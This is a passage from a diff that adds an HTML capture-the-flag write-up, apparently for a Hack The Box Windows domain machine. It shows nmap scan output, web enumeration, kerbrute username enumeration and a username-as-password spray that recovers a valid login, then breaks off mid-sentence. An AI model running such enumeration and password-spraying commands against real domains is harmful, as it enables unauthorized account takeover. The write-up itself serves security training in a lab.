+</span></span><span style="display:flex;"><span>| MRQwEgYDVQQDEwtzY3JtLURDMS1DQTAeFw0yMjA2MDkxNTMwNTdaFw0yMzA2MDkx
+</span></span><span style="display:flex;"><span>| NTMwNTdaMBkxFzAVBgNVBAMTDkRDMS5zY3JtLmxvY2FsMIIBIjANBgkqhkiG9w0B
+</span></span><span style="display:flex;"><span>| AQEFAAOCAQ8AMIIBCgKCAQEA6NaF+YFhvKWiqzcaTT/Kyi8P+so5EJY5xrY16IA/
+</span></span><span style="display:flex;"><span>| DIkctXq4jI4j6BjgHRf48RSUs4EToQpP7PGH4K6NNApu4dE2Z2apc8p9EqXb454S
+</span></span><span style="display:flex;"><span>| f40ZGLgoBRXaZhxQu7az6I7onMBR0RUUzdB+Js3+efj85bHYGz/lkQbekNWydyVe
+</span></span><span style="display:flex;"><span>| DjO7CGqnl5sI+aDhS+vWaV6ODhexLeLSYZ3bn/58B5o012QDQyOrzBXa1cMOBOfI
+</span></span><span style="display:flex;"><span>| CIH3hDnjv3AToEqP349AJ6rWWWSxvLNPjw49Rm+DF4Eyb8irBo0P/F7jMAvlq3t+
+</span></span><span style="display:flex;"><span>| MdKPF9o5Nah7nu1PdVJR0Jg71aj5GJOsTZnSYoWH+CVYDQIDAQABo4IDMTCCAy0w
+</span></span><span style="display:flex;"><span>| LwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQBy
+</span></span><span style="display:flex;"><span>| MB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAw
+</span></span><span style="display:flex;"><span>| eAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCA
+</span></span><span style="display:flex;"><span>| MAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJYIZIAWUDBAECMAsGCWCGSAFl
+</span></span><span style="display:flex;"><span>| AwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNVHQ4EFgQUAIvSJcBszoTslWI8
+</span></span><span style="display:flex;"><span>| kVproj+0lTswHwYDVR0jBBgwFoAUCGlCGQotn3BwNjRGHOcdhhWbaJIwgcQGA1Ud
+</span></span><span style="display:flex;"><span>| HwSBvDCBuTCBtqCBs6CBsIaBrWxkYXA6Ly8vQ049c2NybS1EQzEtQ0EsQ049REMx
+</span></span><span style="display:flex;"><span>| LENOPUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
+</span></span><span style="display:flex;"><span>| Tj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y2VydGlmaWNhdGVSZXZv
+</span></span><span style="display:flex;"><span>| Y2F0aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50
+</span></span><span style="display:flex;"><span>| MIG8BggrBgEFBQcBAQSBrzCBrDCBqQYIKwYBBQUHMAKGgZxsZGFwOi8vL0NOPXNj
+</span></span><span style="display:flex;"><span>| cm0tREMxLUNBLENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1T
+</span></span><span style="display:flex;"><span>| ZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXNjcm0sREM9bG9jYWw/Y0FDZXJ0
+</span></span><span style="display:flex;"><span>| aWZpY2F0ZT9iYXNlP29iamVjdENsYXNzPWNlcnRpZmljYXRpb25BdXRob3JpdHkw
+</span></span><span style="display:flex;"><span>| OgYDVR0RBDMwMaAfBgkrBgEEAYI3GQGgEgQQZxIub1TYH0SkXtctiXUFOYIOREMx
+</span></span><span style="display:flex;"><span>| LnNjcm0ubG9jYWwwTwYJKwYBBAGCNxkCBEIwQKA+BgorBgEEAYI3GQIBoDAELlMt
+</span></span><span style="display:flex;"><span>| MS01LTIxLTI3NDMyMDcwNDUtMTgyNzgzMTEwNS0yNTQyNTIzMjAwLTEwMDAwDQYJ
+</span></span><span style="display:flex;"><span>| KoZIhvcNAQEFBQADggEBAGZWsf9oOMhceZ7IUPGXqwTB8UaTHjw0Xyyrh9SOz2ri
+</span></span><span style="display:flex;"><span>| FksDqqib2V/tsWlEICxX9C+Yrusvppfz2+bpySgPCpFLIqrDes3BskJZRRrWTe8f
+</span></span><span style="display:flex;"><span>| vp4CcaVWnHL6wmF8SPBhp6ji8VPbprFn0TSFnOoVUIVnMefgEcOVc9OtSg//eM0y
+</span></span><span style="display:flex;"><span>| YaTmQZA9d3EuLfyChDmAS8skNWtkLoyenIdwLF5giPbokV3NFujT13X0YYvF/X00
+</span></span><span style="display:flex;"><span>| apzzgN7pH0QgDDY/+GqKzOhrZFbgdqy0M6ZFPe2OuhqTB9+yDXb5sWS6dXFGITpm
+</span></span><span style="display:flex;"><span>| djXHg09ap4TlzGNvRtfjNqvevFGDRHJeIGxGSoLIkDA<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>|_-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>|_ssl-date: 2022-09-20T01:08:14+00:00; +9m34s from scanner time.
+</span></span><span style="display:flex;"><span>4411/tcp  open  found?        syn-ack
+</span></span><span style="display:flex;"><span>| fingerprint-strings: 
+</span></span><span style="display:flex;"><span>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style="display:flex;"><span>|   FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: 
+</span></span><span style="display:flex;"><span>|     SCRAMBLECORP_ORDERS_V1.0.3;
+</span></span><span style="display:flex;"><span>|_    ERROR_UNKNOWN_COMMAND;
+</span></span><span style="display:flex;"><span>5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
+</span></span><span style="display:flex;"><span>49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49706/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>59897/tcp open  msrpc         syn-ack Microsoft Windows RPC
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port4411-TCP:V<span style="color:#f92672">=</span>7.92%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/20%Time<span style="color:#f92672">=</span>63290F81%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
+</span></span><span style="display:flex;"><span>SF:LL,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericLines,1D,<span style="color:#e6db74">&#34;SCRAMBLEC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOptions,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDER
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:S_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPRequest,35,<span style="color:#e6db74">&#34;SCRAMBLEC
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCCheck,1D,<span style="color:#e6db74">&#34;SCR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:AMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVersionBindReqTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECOR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNO
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:WN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLS
+</span></span><span style="display:flex;"><span>SF:SessionReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,1D,<span style="color:#e6db74">&#34;SCRAM
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:BLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>FourO
+</span></span><span style="display:flex;"><span>SF:hFourRequest,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LPDString,35,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LDAPSearchReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%
+</span></span><span style="display:flex;"><span>SF:r<span style="color:#f92672">(</span>LDAPBindReq,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SIPOptions,35,<span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:SCRAMBLECORP_ORDERS_V1\.0\.3;\r\nERROR_UNKNOWN_COMMAND;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>LANDesk
+</span></span><span style="display:flex;"><span>SF:-RC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServer,1D,<span style="color:#e6db74">&#34;SCRAMB
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:LECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NCP,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>NotesRPC,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>JavaRMI,1D,<span style="color:#e6db74">&#34;S
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:CRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>WMSRequest,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>oracle-tns,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">(</span>ms-sql-s,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>afp,1D,<span style="color:#e6db74">&#34;SCRAMBLECOR
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:P_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>giop,1D,<span style="color:#e6db74">&#34;SCRAMBLECORP_ORDERS_V1\.0\.3;\r\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>| ms-sql-info: 
+</span></span><span style="display:flex;"><span>|   10.10.11.168:1433: 
+</span></span><span style="display:flex;"><span>|     Version: 
+</span></span><span style="display:flex;"><span>|       name: Microsoft SQL Server <span style="color:#ae81ff">2019</span> RTM
+</span></span><span style="display:flex;"><span>|       number: 15.00.2000.00
+</span></span><span style="display:flex;"><span>|       Product: Microsoft SQL Server <span style="color:#ae81ff">2019</span>
+</span></span><span style="display:flex;"><span>|       Service pack level: RTM
+</span></span><span style="display:flex;"><span>|       Post-SP patches applied: false
+</span></span><span style="display:flex;"><span>|_    TCP port: <span style="color:#ae81ff">1433</span>
+</span></span><span style="display:flex;"><span>| p2p-conficker: 
+</span></span><span style="display:flex;"><span>|   Checking <span style="color:#66d9ef">for</span> Conficker.C or higher...
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">1</span> <span style="color:#f92672">(</span>port 42300/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>port 10436/tcp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">3</span> <span style="color:#f92672">(</span>port 55122/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   Check <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>port 31813/udp<span style="color:#f92672">)</span>: CLEAN <span style="color:#f92672">(</span>Timeout<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2022-09-20T01:07:39
+</span></span><span style="display:flex;"><span>|_  start_date: N/A
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   3.1.1: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 9m34s, deviation: 0s, median: 9m33s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap done at Tue Sep 20 03:58:42 2022 -- 1 IP address (1 host up) scanned in 512.62 seconds</span></span></span></code></pre></div>
+<p>We can see the usual windows ports are open in addition to port 80 indicating the presence of a webserver and another weird port 4411 which nmap couldn&rsquo;t identify</p>
+<p>We can also see the domain name leaked by ldap (port 389) <em>scrm.local</em> and the domain controller name <em>DC1.scrm.local</em>, so we&rsquo;ll add these to the <em>/etc/hosts</em> file.</p>
+<p>Moving on to the webserver, the first thing I did is to enumerate subdomains while surfing the page but I got nothing.</p>
+<p>Next let&rsquo;s see what the site hides:</p>
+<p><img src="scrm.local-home-page.png" alt="Home Page"></p>
+<p><img src="scrm.local-it-service-page.png" alt="IT Services Page"></p>
+<p>Looking at the <em>IT Support Page</em> we see that NTLM authentication is disabled. This might come in handy if we get any sort of errors when trying to authenticate later.</p>
+<p><img src="scrm.local-contacting-it-support-page.png" alt="Contacting IT Support Page"></p>
+<p><img src="scrm.local-sales-order-app-troubleshooting-page.png" alt="Sales Order App Troubleshooting Page"></p>
+<p><img src="scrm.local-password-resets-page.png" alt="Password Resets Page"></p>
+<p>Moving to other pages, it looks like they are having some troubles, after the breach and they are running some sort of custom application on port 4411 that nmap couldn&rsquo;t identify before. We also got a valid email <em><a href="mailto:support@scrm.local">support@scrm.local</a></em></p>
+<p><img src="scrm.local-new-user-account-page.png" alt="New User Page"></p>
+<p>On the <em>New User Account Page</em> we have a form but I couldn&rsquo;t get any result from it.</p>
+<p>I did try directory bruteforcing but again no results.
+The same goes for fuzzing the application on port <em>4411</em>.</p>
+<p>From here, I thought of using kerberos authentication to bruteforce usernames and maybe passwords also.</p>
+<p>Usually I start enumerating usernames using <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/xato-net-10-million-usernames.txt"><em>seclists/Usernames/xato-net-10-million-usernames.txt</em></a> which is a long list of various usernames to see how usernames look like <em>for example if they use [First Name].[Last Name] or [First Initial].[Last Name] &hellip;</em>, however by looking at the previous terminal screenshot, I can see that <em>ksimpson</em> might be a valid username, so I can assume that usernames are of form <em>[First Initial][Last Name]</em></p>
+<p>Now I can use <a href="https://github.com/ropnop/kerbrute"><em>kerbrute</em></a> with a specific wordlist, like the ones from <a href="https://github.com/attackdebris/kerberos_enum_userlists"><em>kerberos_enum_userlists</em></a>, specifically I&rsquo;ll use <a href="https://github.com/attackdebris/kerberos_enum_userlists/blob/master/A-ZSurnames.txt"><em>A-ZSurnames.txt</em></a> since I know this is how most likely usernames will be.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/kerbrute/kerbrute_linux_amd64 userenum -d scrm.local --dc dc1.scrm.local /opt/kerberos_enum_userlists/A-ZSurnames.txt 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 10/01/22 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022/10/01 01:52:59 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2022/10/01 01:52:59 &gt;  	dc1.scrm.local:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022/10/01 01:53:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	ASMITH@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:54:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	JHALL@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:54:08 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KSIMPSON@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:54:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KHICKS@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:55:05 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	SJENKINS@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:55:56 &gt;  Done! Tested <span style="color:#ae81ff">13000</span> usernames <span style="color:#f92672">(</span><span style="color:#ae81ff">5</span> valid<span style="color:#f92672">)</span> in 176.760 seconds</span></span></code></pre></div>
+<p>After getting these few results, I thought of doing a simple password guessing attack where I&rsquo;ll try to login using the username as the password, having different case sensitivity. What I mean is the following:</p>
+<ul>
+<li>
+<p>First I&rsquo;ll copy these results to a temporarily file called <em>tmp</em>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp 
+</span></span><span style="display:flex;"><span>2022/10/01 01:53:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	ASMITH@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:54:00 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	JHALL@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:54:08 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KSIMPSON@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:54:12 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	KHICKS@scrm.local
+</span></span><span style="display:flex;"><span>2022/10/01 01:55:05 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID USERNAME:	SJENKINS@scrm.local</span></span></code></pre></div></p>
+</li>
+<li>
+<p>Then I&rsquo;ll generate a simple <em>username:password</em> list <em>(of usernames as passwords but having different case sensitivity)</em> because <a href="https://github.com/ropnop/kerbrute"><em>kerbrute</em></a> accepts using this format for bruteforcing
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp | awk <span style="color:#e6db74">&#39;{print $7}&#39;</span> | awk -F<span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#e6db74">&#39;{print $1&#34;:&#34;$1&#34;\n&#34;$1&#34;:&#34;tolower($1)&#34;\n&#34;$1&#34;:&#34;substr($1,0,1)tolower(substr($1,2))&#34;\n&#34;$1&#34;:&#34;substr($1,0,2)tolower(substr($1,3))}&#39;</span>
+</span></span><span style="display:flex;"><span>ASMITH:ASMITH
+</span></span><span style="display:flex;"><span>ASMITH:asmith
+</span></span><span style="display:flex;"><span>ASMITH:Asmith
+</span></span><span style="display:flex;"><span>ASMITH:ASmith
+</span></span><span style="display:flex;"><span>JHALL:JHALL
+</span></span><span style="display:flex;"><span>JHALL:jhall
+</span></span><span style="display:flex;"><span>JHALL:Jhall
+</span></span><span style="display:flex;"><span>JHALL:JHall
+</span></span><span style="display:flex;"><span>KSIMPSON:KSIMPSON
+</span></span><span style="display:flex;"><span>KSIMPSON:ksimpson
+</span></span><span style="display:flex;"><span>KSIMPSON:Ksimpson
+</span></span><span style="display:flex;"><span>KSIMPSON:KSimpson
+</span></span><span style="display:flex;"><span>KHICKS:KHICKS
+</span></span><span style="display:flex;"><span>KHICKS:khicks
+</span></span><span style="display:flex;"><span>KHICKS:Khicks
+</span></span><span style="display:flex;"><span>KHICKS:KHicks
+</span></span><span style="display:flex;"><span>SJENKINS:SJENKINS
+</span></span><span style="display:flex;"><span>SJENKINS:sjenkins
+</span></span><span style="display:flex;"><span>SJENKINS:Sjenkins
+</span></span><span style="display:flex;"><span>SJENKINS:SJenkins</span></span></code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat tmp | awk <span style="color:#e6db74">&#39;{print $7}&#39;</span> | awk -F<span style="color:#e6db74">&#39;@&#39;</span> <span style="color:#e6db74">&#39;{print $1&#34;:&#34;$1&#34;\n&#34;$1&#34;:&#34;tolower($1)&#34;\n&#34;$1&#34;:&#34;substr($1,0,1)tolower(substr($1,2))&#34;\n&#34;$1&#34;:&#34;substr($1,0,2)tolower(substr($1,3))}&#39;</span> &gt; users-passwords.txt</span></span></code></pre></div></p>
+</li>
+<li>
+<p>Using this method, I will try <em>4 invalid login attemps</em> per account which will most likely not trigger any account lockout.
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ /opt/kerbrute/kerbrute_linux_amd64 bruteforce --dc dc1.scrm.local -d scrm.local users-passwords.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    __             __               __     
+</span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
+</span></span><span style="display:flex;"><span>  / //_/ _ <span style="color:#ae81ff">\/</span> ___/ __ <span style="color:#ae81ff">\/</span> ___/ / / / __/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+</span></span><span style="display:flex;"><span>/_/|_|<span style="color:#ae81ff">\_</span>__/_/  /_.___/_/   <span style="color:#ae81ff">\_</span>_,_/<span style="color:#ae81ff">\_</span>_/<span style="color:#ae81ff">\_</span>__/                                        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Version: v1.0.3 <span style="color:#f92672">(</span>9dad6e1<span style="color:#f92672">)</span> - 10/01/22 - Ronnie Flathers @ropnop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022/10/01 02:17:29 &gt;  Using KDC<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2022/10/01 02:17:29 &gt;  	dc1.scrm.local:88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2022/10/01 02:17:30 &gt;  <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> VALID LOGIN:	KSIMPSON@scrm.local:ksimpson
+</span></span><span style="display:flex;"><span>2022/10/01 02:17:30 &gt;  Done! Tested <span style="color:#ae81ff">20</span> logins <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> successes<span style="color:#f92672">)</span> in 0.831 seconds</span></span></code></pre></div></p>
+</li>
+</ul>
+<p>And we got a valid hit!! However I can&rsquo;t use these credentials directly because <em>NTLM authentication is disabled</em>, so I had to think of other solutions, like using kerberos tickets to interact with the domain.</p>
+<p>To do that I need to request a <em>Ticket Granting Ticket</em> from the domain controller, which I will use to authenticate to other services like LDAP.
+For this I will use <a href="https://github.com/SecureAuthCorp/impacket"><em>impacket-scripts</em></a>
